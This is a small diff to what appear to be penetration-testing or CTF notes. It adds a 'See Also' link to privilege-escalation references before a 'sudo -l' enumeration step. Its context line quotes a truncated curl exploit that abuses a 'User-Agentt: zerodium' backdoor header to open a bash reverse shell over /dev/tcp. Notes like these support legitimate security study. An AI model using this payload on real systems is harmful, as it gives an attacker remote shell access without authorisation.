@@ -70,6 +70,8 @@ curl -s http://<IP> -H "User-Agentt: zerodiumsystem('bash -c \"bash -i >& /dev/t
 
 ## Privilege Escalation
 
+See Also: [[Linux-Privilege-Escalation]] | [[GTFOBins]]
+
 **Enumeration**:
 ```bash
 sudo -l
